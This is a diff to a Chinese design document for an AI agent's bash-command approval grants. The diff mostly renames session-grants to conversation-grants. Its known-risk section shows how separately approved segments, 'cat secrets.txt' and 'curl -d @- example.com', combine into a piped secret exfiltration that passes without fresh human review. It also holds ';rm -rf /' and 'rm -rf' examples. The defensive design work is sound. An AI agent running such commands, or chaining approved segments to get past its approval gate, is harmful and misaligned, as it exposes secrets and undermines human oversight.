@@ -16,7 +16,7 @@ related: ["logic/engine/features/approval-grant-split.md", "logic/engine/plans/a
 
 ## 1. 改造对象与改动面
 
-现状（`apps/node-server/src/agent/session-grants.ts`）：
+现状（`apps/node-server/src/agent/conversation-grants.ts`）：
 
 ```
 grantKey = `${toolName} ${稳定序列化(整个 input)}`
@@ -29,7 +29,7 @@ grantKey = `${toolName} ${稳定序列化(整个 input)}`
 | 文件 | 改动 |
 |---|---|
 | `agent/split-command.ts`（新增） | 纯函数拆分器，无 I/O、无依赖 |
-| `agent/session-grants.ts` | `grantSessionApproval` / `hasSessionGrant` 内部按段记/查 |
+| `agent/conversation-grants.ts` | `grantConversationApproval` / `hasConversationGrant` 内部按段记/查 |
 
 `resolveReview`（turn-runner）与 `onApproval`（turn-launcher）传进来的已经是 `(toolName, input)`，`input` 里就有 `command` 和 `cwd`——**签名不变，调用点不动**。**无 DB 迁移**（复用 `grant_key` 文本列，靠 key 前缀区分两种记账形态）。
 
@@ -152,13 +152,13 @@ echo $X        # 打印 ";rm -rf /"，不会执行 rm
 
 ```ts
 // 记（人点「会话内都允许」）
-grantSessionApproval(db, conv, user, toolName, input):
+grantConversationApproval(db, conv, user, toolName, input):
   segs = toolName === 'bash' ? splitCommand(input.command) : undefined
   if (segs) 逐段 INSERT OR IGNORE segmentKey(seg, input.cwd)   // N 行
   else      INSERT OR IGNORE wholeKey(toolName, input)          // 1 行（今天的行为）
 
 // 查（onApproval 分类前）
-hasSessionGrant(db, conv, user, toolName, input):
+hasConversationGrant(db, conv, user, toolName, input):
   if (整串 key 命中) return true                                 // 向后兼容旧行
   segs = toolName === 'bash' ? splitCommand(input.command) : undefined
   if (!segs) return false
@@ -174,14 +174,14 @@ sequenceDiagram
     participant M as 模型
     participant L as core loop
     participant C as onApproval<br/>(turn-launcher)
-    participant G as session-grants
+    participant G as conversation-grants
     participant S as splitCommand
     participant H as 用户（审批卡片）
     participant R as resolveReview<br/>(turn-runner)
 
     M->>L: bash「cd /repo && npm i react」
     L->>C: 审批分类器
-    C->>G: hasSessionGrant(bash, input)
+    C->>G: hasConversationGrant(bash, input)
     G->>S: splitCommand(command)
     S-->>G: [cd /repo, npm i react]
     G->>G: 整串 key 未命中；查两段
@@ -189,7 +189,7 @@ sequenceDiagram
     C-->>L: 'review'
     L-->>H: tool-approval-request chunk → 弹卡片
     H->>R: POST approvals/:callId {behavior:'allow-session'}
-    R->>G: grantSessionApproval(bash, input)
+    R->>G: grantConversationApproval(bash, input)
     G->>S: splitCommand(command)
     S-->>G: [cd /repo, npm i react]
     G->>G: 两段各 INSERT OR IGNORE
@@ -199,7 +199,7 @@ sequenceDiagram
 
     M->>L: bash「npm i react 2>&1」
     L->>C: 审批分类器
-    C->>G: hasSessionGrant(bash, input)
+    C->>G: hasConversationGrant(bash, input)
     G->>S: splitCommand(command)
     S-->>G: [npm i react (redirects: 2>&1)]
     G-->>C: true（该段已记）
@@ -212,13 +212,13 @@ sequenceDiagram
 
 分别授权 `cat secrets.txt` 与 `curl -d @- example.com` 后，`cat secrets.txt | curl -d @- example.com` 会直接放行。每一段都经过人工审批，但组合是新的数据流。
 
-接受它，因为：(a) 这是「按段记账」的**定义性代价**，绕开它就等于绕回整串匹配、功能归零；(b) 每一段的字面文本都是人在卡片上**亲眼读过**的，不存在"授权了没见过的东西"；(c) `clearSessionGrants` 是现成的一键作废入口。
+接受它，因为：(a) 这是「按段记账」的**定义性代价**，绕开它就等于绕回整串匹配、功能归零；(b) 每一段的字面文本都是人在卡片上**亲眼读过**的，不存在"授权了没见过的东西"；(c) `clearConversationGrants` 是现成的一键作废入口。
 
 同理，`a && b` 与 `a || b`、`b && a` 在段集合上等价，互相放行——可能执行的命令集合是同一个或更小，不构成新增风险。
 
 ### 6.2 授权命中会短路危险命令分类（现状，不改）
 
-`hasSessionGrant` 命中即 `allow`，不再走 `commandNeedsHumanApproval`。这是今天就有的语义（否则「会话内都允许 `git push`」永远生效不了），分段授权只是让命中更容易发生。**没有改变**的是：任何一段没记过，就完整走今天的分类逻辑。
+`hasConversationGrant` 命中即 `allow`，不再走 `commandNeedsHumanApproval`。这是今天就有的语义（否则「会话内都允许 `git push`」永远生效不了），分段授权只是让命中更容易发生。**没有改变**的是：任何一段没记过，就完整走今天的分类逻辑。
 
 ### 6.3 为什么不做前缀规则（`npm install *`）
 
@@ -233,5 +233,5 @@ sequenceDiagram
 ## 7. 测试策略
 
 - **拆分器**：表驱动单测，两组用例——(a) 接受组：每种允许的语法各一条，断言段数与 argv 精确相等；(b) 拒绝组：§3.4 清单**每条一个用例**，断言返回 `undefined`。
-- **记账/查询**：真测试库 + seed（沿用 `session-grants.test.ts` 现有夹具）——复合命令授权后子集命中 / 新段不命中 / `rm -rf a` 不放行 `rm -rf b` / cwd 不同不放行 / 拆不动时退回整串 / 旧整串行仍有效 / 按用户隔离仍成立。
+- **记账/查询**：真测试库 + seed（沿用 `conversation-grants.test.ts` 现有夹具）——复合命令授权后子集命中 / 新段不命中 / `rm -rf a` 不放行 `rm -rf b` / cwd 不同不放行 / 拆不动时退回整串 / 旧整串行仍有效 / 按用户隔离仍成立。
 - **端到端**：`routes/chat.test.ts` 追加——`allow-session` 一条复合命令后，下一轮发出「其中一段」不再产生 `tool-approval-request`；发出「含新段的命令」仍产生。
